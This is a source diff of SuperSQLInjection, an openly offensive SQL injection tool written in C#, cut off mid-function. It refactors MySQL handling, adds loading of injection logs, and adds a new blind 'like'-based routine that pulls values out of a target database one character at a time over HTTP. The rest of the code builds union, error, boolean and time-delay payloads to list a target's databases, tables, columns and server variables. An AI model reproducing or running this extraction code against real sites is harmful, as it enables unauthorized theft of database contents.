@@ -140,7 +140,19 @@ namespace SuperSQLInjection
             {
                 new Thread(checkUpdate).Start();
             }
-            
+            //加载注入日志记录
+            Thread tt = new Thread(loadInjectLogs);
+            tt.Start();
+
+        }
+        public void loadInjectLogs() {
+            //加载注入日志记录
+            List<String> clist = Tools.readAllXmlFile(AppDomain.CurrentDomain.BaseDirectory + "/logs/injection/", null);
+            foreach (String path in clist)
+            {
+                Config config = XML.readConfig(path);
+                this.Invoke(new delegatelogInject(logInjectTolvw), config);
+            }
         }
         public void HttpDownloadFile(string url, string path)
         {
@@ -218,7 +230,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20181119;
+        public static int version = 20181204;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -255,13 +267,12 @@ namespace SuperSQLInjection
                 }
                 else
                 {
-
-                    MessageBox.Show("自动检查更新，没有发现新版本！");
+                    this.Invoke(new showLogDelegate(log), "自动检查更新，没有发现新版本！", LogLevel.info);
                 }
             }
             catch (Exception e)
             {
-                MessageBox.Show("未发现新版本！");
+                this.Invoke(new showLogDelegate(log), "更新异常！" + e.Message, LogLevel.info);
             }
         }
 
@@ -297,22 +308,8 @@ namespace SuperSQLInjection
                 MessageBox.Show("注入类型还未设置，您可以人工设置或点击自动识别！");
                 return false;
             }
-
-            switch (this.cbox_basic_injectType.SelectedIndex)
-            {
-                case 0:
-                    config.injectType = InjectType.UnKnow;
-                    break;
-                case 1:
-                    config.injectType = InjectType.Bool;
-                    break;
-                case 2:
-                    config.injectType = InjectType.Error;
-                    break;
-                case 3:
-                    config.injectType = InjectType.Union;
-                    break;
-            }
+            config.injectType = (InjectType)this.cbox_basic_injectType.SelectedIndex;
+           
 
             if (DBType.UnKnow.Equals(config.dbType))
             {
@@ -320,29 +317,8 @@ namespace SuperSQLInjection
                 return false;
             }
 
-            switch (this.cbox_basic_dbType.SelectedIndex)
-            {
-                case 0:
-                    config.dbType = DBType.UnKnow;
-                    break;
-                case 1:
-                    config.dbType = DBType.Access;
-                    break;
-                case 2:
-                    config.dbType = DBType.MySQL5;
-                    break;
-                case 3:
-                    config.dbType = DBType.SQLServer;
-                    break;
-                case 4:
-                    config.dbType = DBType.Oracle;
-                    break;
-                case 5:
-                    config.dbType = DBType.MySQL4;
-                    break;
-            }
-
-
+            config.dbType = (DBType)this.cbox_basic_dbType.SelectedIndex;
+   
             try
             {
                 config.timeOut = int.Parse(this.cbox_basic_timeOut.Text);
@@ -579,8 +555,8 @@ namespace SuperSQLInjection
             String[] sv = v.ToString().Split(':');
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
-            String columns = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, column_list, null, null, -1);
-            String pay_load = MySQL5.union_value.Replace("{data}", columns);
+            String columns = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, column_list, null, null, -1);
+            String pay_load = MySQL.union_value.Replace("{data}", columns);
             String result = getOneDataByUnionOrError(pay_load);
             this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
             Interlocked.Increment(ref this.currentDataCount);
@@ -611,8 +587,8 @@ namespace SuperSQLInjection
             String[] sv = v.ToString().Split(':');
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
-            String columns = MySQL5.creatMySQLColumnsStrByError(column_list, null, null, -1);
-            String pay_load = MySQL5.error_value.Replace("{data}", columns);
+            String columns = MySQL.creatMySQLColumnsStrByError(column_list, null, null, -1);
+            String pay_load = MySQL.error_value.Replace("{data}", columns);
             String result = getOneDataByUnionOrError(pay_load);
             this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
             Interlocked.Increment(ref this.currentDataCount);
@@ -663,14 +639,13 @@ namespace SuperSQLInjection
                 case DBType.Access:
                     MessageBox.Show("报告大侠，Access数据库不支持此功能！");
                     break;
-                case DBType.MySQL4: break;
-                case DBType.MySQL5:
-                    this.dataCount = MySQL5.vers.Count;
-                    if (MySQL5.vers != null && MySQL5.vers.Count > 0)
+                case DBType.MySQL:
+                    this.dataCount = MySQL.vers.Count;
+                    if (MySQL.vers != null && MySQL.vers.Count > 0)
                     {
-                        for (int j = 0; j < MySQL5.vers.Count; j++)
+                        for (int j = 0; j < MySQL.vers.Count; j++)
                         {
-                            String v = MySQL5.vers[j];
+                            String v = MySQL.vers[j];
                             //获取对应环境变量值
                             stp.QueueWorkItem<String>(getVariablesByUnionByMySQL5, v);
                         }
@@ -727,17 +702,13 @@ namespace SuperSQLInjection
                 case DBType.Access:
                     MessageBox.Show("抱歉，Access数据库不支持错误显示方式注入！");
                     break;
-
-                case DBType.MySQL4:
-                    MessageBox.Show("抱歉，MySQL4以下版本不支持错误显示方式注入！");
-                    break;
-                case DBType.MySQL5:
-                    this.dataCount = MySQL5.vers.Count;
-                    if (MySQL5.vers != null && MySQL5.vers.Count > 0)
+                case DBType.MySQL:
+                    this.dataCount = MySQL.vers.Count;
+                    if (MySQL.vers != null && MySQL.vers.Count > 0)
                     {
-                        for (int j = 0; j < MySQL5.vers.Count; j++)
+                        for (int j = 0; j < MySQL.vers.Count; j++)
                         {
-                            String v = MySQL5.vers[j];
+                            String v = MySQL.vers[j];
                             //获取对应环境变量值
                             stp.QueueWorkItem<String>(getVariablesByErrorByMySQL5, v);
                         }
@@ -795,16 +766,13 @@ namespace SuperSQLInjection
                 case DBType.Access:
                     MessageBox.Show("报告大侠，Access数据库不支持此功能！");
                     break;
-                case DBType.MySQL4:
-
-                    break;
-                case DBType.MySQL5:
-                    this.dataCount = MySQL5.vers.Count;
-                    if (MySQL5.vers != null && MySQL5.vers.Count > 0)
+                case DBType.MySQL:
+                    this.dataCount = MySQL.vers.Count;
+                    if (MySQL.vers != null && MySQL.vers.Count > 0)
                     {
-                        for (int j = 0; j < MySQL5.vers.Count; j++)
+                        for (int j = 0; j < MySQL.vers.Count; j++)
                         {
-                            String v = MySQL5.vers[j];
+                            String v = MySQL.vers[j];
                             //获取对应环境变量值
                             if (config.keyType.Equals(KeyType.Time))
                             {
@@ -935,10 +903,10 @@ namespace SuperSQLInjection
             try
             {
                 String[] vs = vers.ToString().Split(':');
-                String payload_len = MySQL5.ver_length.Replace("{data}", vs[1]);
+                String payload_len = MySQL.ver_length.Replace("{data}", vs[1]);
                 int len = getValueByStepUp(payload_len, 0, 10);
-                this.Invoke(new showLogDelegate(log), vs[0] + "长度为-----：" + len, LogLevel.info);
-                String va_payload = MySQL5.ver_value.Replace("{data}", vs[1]);
+                this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
+                String va_payload = MySQL.ver_value.Replace("{data}", vs[1]);
                 String value = "";
                 //获取值
                 for (int i = 1; i <= len; i++)
@@ -947,7 +915,7 @@ namespace SuperSQLInjection
                     int ascii = getValue(tmp_va_payload, 32, 126);
                     value += ((char)ascii).ToString();
                 }
-                this.Invoke(new showLogDelegate(log), vs[0] + "值为-----：" + value, LogLevel.info);
+                this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
                 this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
 
             }
@@ -965,11 +933,11 @@ namespace SuperSQLInjection
             {
                 String[] vs = vers.ToString().Split(':');
 
-                String payload_len = MySQL5.getBoolCountBySleep(MySQL5.bool_length, config.maxTime).Replace("{data}", vs[1]);
+                String payload_len = MySQL.getBoolCountBySleep(MySQL.bool_length, config.maxTime).Replace("{data}", vs[1]);
 
                 int len = getValueByStepUp(payload_len, 0, 10);
-                this.Invoke(new showLogDelegate(log), vs[0] + "长度为-----：" + len, LogLevel.info);
-                String va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value, config.maxTime).Replace("{data}", vs[1]);
+                this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
+                String va_payload = MySQL.getBoolCountBySleep(MySQL.bool_value, config.maxTime).Replace("{data}", vs[1]);
                 String value = "";
                 //获取值
                 for (int i = 1; i <= len; i++)
@@ -978,7 +946,7 @@ namespace SuperSQLInjection
                     int ascii = getValue(tmp_va_payload, 32, 126);
                     value += ((char)ascii).ToString();
                 }
-                this.Invoke(new showLogDelegate(log), vs[0] + "值为-----：" + value, LogLevel.info);
+                this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
                 this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
 
             }
@@ -1003,7 +971,7 @@ namespace SuperSQLInjection
                 //判断变量长度
                 String payload_len = MSSQL.getBoolCountBySleep(MSSQL.bool_length, config.maxTime).Replace("{data}", vs[1]);
                 int len = getValueByStepUp(payload_len, 0, 10);
-                this.Invoke(new showLogDelegate(log), vs[0] + "长度为-----：" + len, LogLevel.info);
+                this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                 String va_payload = MSSQL.getBoolCountBySleep(MSSQL.bool_value, config.maxTime).Replace("{data}", vs[1]);
                 String value = "";
                 //获取值
@@ -1017,7 +985,7 @@ namespace SuperSQLInjection
                     value += Tools.unHexByUnicode(unicode, config.db_encoding);
                     //设置值,这里由于是unicode值，需要转换 
                 }
-                this.Invoke(new showLogDelegate(log), vs[0] + "值为-----：" + value,LogLevel.info);
+                this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value,LogLevel.info);
                 this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
 
             }
@@ -1038,21 +1006,27 @@ namespace SuperSQLInjection
                 String[] vs = vers.ToString().Split(':');
                 //判断变量长度
                 int len = getValueByStepUp(MSSQL.bool_length.Replace("{data}", vs[1]), 0, 10);
-                this.Invoke(new showLogDelegate(log), vs[0] + "长度为-----：" + len,LogLevel.info);
+                this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len,LogLevel.info);
                 String value = "";
-                //获取值
-                for (int i = 1; i <= len; i++)
+                if (config.useLike)
                 {
-
-                    //select UNICODE(substring(@@version,{index},1))
-                    //取值payload，替换对应下标值
-                    String unicode_data_payload = MSSQL.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
-                    int unicode = getValue(MSSQL.bool_value.Replace("{data}", unicode_data_payload), 32, 126);
-
-                    value += Tools.unHexByUnicode(unicode, config.db_encoding);
-                    //设置值,这里由于是unicode值，需要转换 
+                    value= getLikeValue(vs[1]);
                 }
-                this.Invoke(new showLogDelegate(log), vs[0] + "值为-----：" + value, LogLevel.info);
+                else {
+                    //获取值
+                    for (int i = 1; i <= len; i++)
+                    {
+
+                        //select UNICODE(substring(@@version,{index},1))
+                        //取值payload，替换对应下标值
+                        String unicode_data_payload = MSSQL.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
+                        int unicode = getValue(MSSQL.bool_value.Replace("{data}", unicode_data_payload), 32, 126);
+
+                        value += Tools.unHexByUnicode(unicode, config.db_encoding);
+                        //设置值,这里由于是unicode值，需要转换 
+                    }
+                }
+                this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
                 this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
 
             }
@@ -1075,7 +1049,7 @@ namespace SuperSQLInjection
                 String[] vs = vers.ToString().Split(':');
                 //判断变量长度
                 int len = getValueByStepUp(Oracle.bool_length.Replace("{data}", vs[1]), 0, 10);
-                this.Invoke(new showLogDelegate(log), vs[0] + "长度为-----：" + len, LogLevel.info);
+                this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
 
                 String va_payload = Oracle.bool_value.Replace("{data}", vs[1]);
                 String value = "";
@@ -1086,7 +1060,7 @@ namespace SuperSQLInjection
                     int ascii = getValue(dp, 32, 126);
                     value += (char)ascii;
                 }
-                this.Invoke(new showLogDelegate(log), vs[0] + "值为-----：" + value, LogLevel.info);
+                this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
                 this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
 
             }
@@ -1135,22 +1109,22 @@ namespace SuperSQLInjection
             {
                 int db_index = int.Parse(oindex.ToString());
                 //判断对应下标的数据库长度
-                String payload_len = MySQL5.ver_length.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString()));
+                String payload_len = MySQL.ver_length.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString()));
                 if (config.keyType.Equals(KeyType.Time))
                 {
-                    payload_len = MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
+                    payload_len = MySQL.getBoolCountBySleep(MySQL.bool_length.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                 }
 
 
                 //判断当前数据库长度限制1-50
                 int len = getValue(payload_len, 1, 50);
-                this.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为-----：" + len, LogLevel.info);
+                this.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为：" + len, LogLevel.info);
 
                 //判断当前数据库对应的ascii码
-                String va_payload = MySQL5.ver_value.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString()));
+                String va_payload = MySQL.ver_value.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString()));
                 if (config.keyType.Equals(KeyType.Time))
                 {
-                    va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
+                    va_payload = MySQL.getBoolCountBySleep(MySQL.bool_value.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                 }
                 String value = "";
                 //获取值
@@ -1191,7 +1165,7 @@ namespace SuperSQLInjection
                 String data_payload = MSSQL.db_value.Replace("{index}", db_index.ToString());
                 int len = getValueByStepUp(MSSQL.bool_length.Replace("{data}", data_payload), 0, 10);
 
-                this.Invoke(new showLogDelegate(log), "数据库" + db_index + "长度为-----：" + len,LogLevel.info);
+                this.Invoke(new showLogDelegate(log), "数据库" + db_index + "长度为：" + len,LogLevel.info);
 
                 //判断当前数据库对应的ascii码
                 String va_payload = MSSQL.bool_value.Replace("{data}", MSSQL.db_value.Replace("{index}", oindex.ToString()));
@@ -1247,7 +1221,7 @@ namespace SuperSQLInjection
                 String data_payload = MSSQL.db_value.Replace("{index}", db_index.ToString());
                 int len = getValueByStepUp(MSSQL.getBoolCountBySleep(MSSQL.bool_length.Replace("{data}", data_payload), config.maxTime), 0, 10);
 
-                this.Invoke(new showLogDelegate(log), "数据库" + db_index + "长度为-----：" + len, LogLevel.info);
+                this.Invoke(new showLogDelegate(log), "数据库" + db_index + "长度为：" + len, LogLevel.info);
 
                 String value = "";
                 //获取值
@@ -1313,7 +1287,7 @@ namespace SuperSQLInjection
 
                 //判断当前数据库长度限制1-50
                 int len = getValue(payload_len, 1, 50);
-                this.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为-----：" + len,LogLevel.info);
+                this.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为：" + len,LogLevel.info);
 
                 //判断当前数据库对应的ascii码
                 String va_payload = Oracle.bool_value.Replace("{data}", Oracle.db_value.Replace("{index}", oindex.ToString()));
@@ -1353,9 +1327,9 @@ namespace SuperSQLInjection
             {
                 //获取数据库数量
                 List<String> data_list = new List<String>();
-                data_list.Add(MySQL5.db_value.Replace("{index}", oindex.ToString()));
-                String db_Name_data = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
-                String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", db_Name_data));
+                data_list.Add(MySQL.db_value.Replace("{index}", oindex.ToString()));
+                String db_Name_data = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
+                String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", db_Name_data));
                 this.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result,LogLevel.info);
                 this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
             }
@@ -1419,9 +1393,9 @@ namespace SuperSQLInjection
             try
             {
                 List<String> data_list = new List<String>();
-                data_list.Add(MySQL5.db_value.Replace("{index}", oindex.ToString()));
-                String db_Name_data = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
-                String result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", db_Name_data));
+                data_list.Add(MySQL.db_value.Replace("{index}", oindex.ToString()));
+                String db_Name_data = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
+                String result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", db_Name_data));
                 this.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                 this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
             }
@@ -1491,23 +1465,23 @@ namespace SuperSQLInjection
                 SelectNode sn = (SelectNode)osn;
                 int selectIndex = sn.tn.Index;
                 //判断当前表长度
-                String data_payload = MySQL5.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit + "");
+                String data_payload = MySQL.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit + "");
                 int len = 0;
                 if (config.keyType.Equals(KeyType.Time))
                 {
-                    len = getValue(MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
+                    len = getValue(MySQL.getBoolCountBySleep(MySQL.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                 }
                 else
                 {
-                    len = getValue(MySQL5.ver_length.Replace("{data}", data_payload), 1, 50);
+                    len = getValue(MySQL.ver_length.Replace("{data}", data_payload), 1, 50);
                 }
 
 
                 //判断当前数据库对应的ascii码
-                String va_payload = MySQL5.ver_value.Replace("{data}", data_payload);
+                String va_payload = MySQL.ver_value.Replace("{data}", data_payload);
                 if (config.keyType.Equals(KeyType.Time))
                 {
-                    va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value, config.maxTime).Replace("{data}", data_payload);
+                    va_payload = MySQL.getBoolCountBySleep(MySQL.bool_value, config.maxTime).Replace("{data}", data_payload);
                 }
 
                 String value = "";
@@ -1682,9 +1656,9 @@ namespace SuperSQLInjection
 
             SelectNode sn = (SelectNode)osn;
             List<String> data_list = new List<String>();
-            data_list.Add(MySQL5.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
-            String tables_value_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
-            String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", tables_value_payload));
+            data_list.Add(MySQL.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
+            String tables_value_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
+            String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", tables_value_payload));
 
             this.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
             this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
@@ -1727,9 +1701,9 @@ namespace SuperSQLInjection
 
             SelectNode sn = (SelectNode)osn;
             List<String> data_list = new List<String>();
-            data_list.Add(MySQL5.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
-            String table_value_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
-            String result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", table_value_payload));
+            data_list.Add(MySQL.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
+            String table_value_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
+            String result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", table_value_payload));
 
             this.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
             this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
@@ -1820,6 +1794,43 @@ namespace SuperSQLInjection
             return newpayload;
         }
 
+        static char[] ss = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9', '_'};
+
+
+
+        
+        /// <summary>
+        /// Like判断
+        /// </summary>
+        /// <param name="payLoadStr">获取数据Like paylaod</param>
+        /// <param name="start">开始值</param>
+        /// <param name="end">最大值</param>
+        /// <returns></returns>
+        public String getLikeValue(String payLoadStr)
+        {
+            int index = 0;
+            StringBuilder value = new StringBuilder();
+            String startStr = "";
+            while (index<ss.Length)
+            {
+
+                String payload = payLoadStr+ " like '" + startStr + ss[index]+"%'";
+                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType);
+                if (exists)
+                {
+                    
+                    startStr += ss[index] + "";
+                    index = 0;
+                }
+                else {
+                    index++;
+                }
+                
+            }
+            return startStr;
+
+        }
         /// <summary>
         /// 二分法判断
         /// </summary>
@@ -2093,14 +2104,11 @@ namespace SuperSQLInjection
                 case DBType.Access:
                     MessageBox.Show("抱歉Access数据库，不支持错误显示注入！");
                     break;
-                case DBType.MySQL4:
-                    MessageBox.Show("抱歉MySQL4数据库，不支持错误显示注入！");
-                    break;
-                case DBType.MySQL5:
+                case DBType.MySQL:
 
-                    data_list.Add(MySQL5.dbs_count);
-                    db_Count_data = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
-                    result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", db_Count_data));
+                    data_list.Add(MySQL.dbs_count);
+                    db_Count_data = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
+                    result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", db_Count_data));
                     this.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                     db_len = Tools.convertToInt(result);
                     this.dbsCount = db_len;
@@ -2174,13 +2182,11 @@ namespace SuperSQLInjection
             {
                 case DBType.Access:
                     break;
-                case DBType.MySQL4:
-                    break;
-                case DBType.MySQL5:
+                case DBType.MySQL:
                     //获取数据库数量
-                    data_list.Add(MySQL5.dbs_count);
-                    db_Count_data = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
-                    result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", db_Count_data));
+                    data_list.Add(MySQL.dbs_count);
+                    db_Count_data = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
+                    result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", db_Count_data));
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                     db_len = Tools.convertToInt(result);
@@ -2253,18 +2259,15 @@ namespace SuperSQLInjection
                 case DBType.Access:
                     MessageBox.Show("Access数据库没有库！");
                     break;
-                case DBType.MySQL4:
-
-                    break;
-                case DBType.MySQL5:
+                case DBType.MySQL:
                     //获取数据库数量
                     if (KeyType.Time.Equals(config.keyType))
                     {
-                        db_len = getValueByStepUp(MySQL5.getBoolCountBySleep(MySQL5.dbs_count, config.maxTime), 0, 10);
+                        db_len = getValueByStepUp(MySQL.getBoolCountBySleep(MySQL.dbs_count, config.maxTime), 0, 10);
                     }
                     else
                     {
-                        db_len = getValueByStepUp(MySQL5.bool_db_count, 0, 10);
+                        db_len = getValueByStepUp(MySQL.bool_db_count, 0, 10);
                     }
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！", LogLevel.info);
@@ -2436,19 +2439,16 @@ namespace SuperSQLInjection
                     }
                     checkTablesDic(tn);
                     break;
-                case DBType.MySQL4:
-
-                    break;
-                case DBType.MySQL5:
+                case DBType.MySQL:
                     //获取当前数据库长度
 
                     if (config.keyType.Equals(KeyType.Time))
                     {
-                        this.tableCount = getValueByStepUp(MySQL5.getBoolCountBySleep(MySQL5.tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), config.maxTime), 0, 50);
+                        this.tableCount = getValueByStepUp(MySQL.getBoolCountBySleep(MySQL.tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), config.maxTime), 0, 50);
                     }
                     else
                     {
-                        this.tableCount = getValueByStepUp(MySQL5.bool_tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), 0, 50);
+                        this.tableCount = getValueByStepUp(MySQL.bool_tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), 0, 50);
                     }
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
@@ -2530,14 +2530,11 @@ namespace SuperSQLInjection
                     }
                     checkTablesDic(tn);
                     break;
-                case DBType.MySQL4:
-
-                    break;
-                case DBType.MySQL5:
+                case DBType.MySQL:
                     //获取当前数据库表数量
-                    data_list.Add(MySQL5.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
-                    tables_count_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
-                    result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", tables_count_payload));
+                    data_list.Add(MySQL.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
+                    tables_count_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
+                    result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", tables_count_payload));
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                     this.tableCount = Tools.convertToInt(result);
@@ -2605,14 +2602,11 @@ namespace SuperSQLInjection
                 case DBType.Access:
                     MessageBox.Show("抱歉Access数据库不支持错误显示注入！");
                     break;
-                case DBType.MySQL4:
-                    MessageBox.Show("抱歉MySQL4数据库，不支持错误显示注入！");
-                    break;
-                case DBType.MySQL5:
+                case DBType.MySQL:
                     //获取当前数据库表长度
-                    data_list.Add(MySQL5.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
-                    tables_count_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
-                    result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", tables_count_payload));
+                    data_list.Add(MySQL.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
+                    tables_count_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
+                    result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", tables_count_payload));
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                     this.tableCount = Tools.convertToInt(result);
@@ -2786,23 +2780,23 @@ namespace SuperSQLInjection
             {
                 SelectNode sn = (SelectNode)osn;
                 //判断当前表长度
-                String data_payload = MySQL5.column_value.Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")).Replace("{index}", sn.limit + "").Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8"));
+                String data_payload = MySQL.column_value.Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")).Replace("{index}", sn.limit + "").Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8"));
                 int len = 0;
                 if (KeyType.Time.Equals(config.keyType))
                 {
-                    len = getValue(MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
+                    len = getValue(MySQL.getBoolCountBySleep(MySQL.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                 }
                 else
                 {
 
-                    len = getValue(MySQL5.ver_length.Replace("{data}", data_payload), 1, 50);
+                    len = getValue(MySQL.ver_length.Replace("{data}", data_payload), 1, 50);
                 }
 
                 //判断当前数据库对应的ascii码
-                String va_payload = MySQL5.ver_value.Replace("{data}", data_payload);
+                String va_payload = MySQL.ver_value.Replace("{data}", data_payload);
                 if (KeyType.Time.Equals(config.keyType))
                 {
-                    va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value.Replace("{data}", data_payload), config.maxTime);
+                    va_payload = MySQL.getBoolCountBySleep(MySQL.bool_value.Replace("{data}", data_payload), config.maxTime);
                 }
                 String value = "";
                 //获取值
@@ -2975,9 +2969,9 @@ namespace SuperSQLInjection
                 SelectNode sn = (SelectNode)osn;
                 //获取数据库数量
                 List<String> data_list = new List<String>();
-                data_list.Add(MySQL5.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
-                String column_Name_data = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
-                String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", column_Name_data));
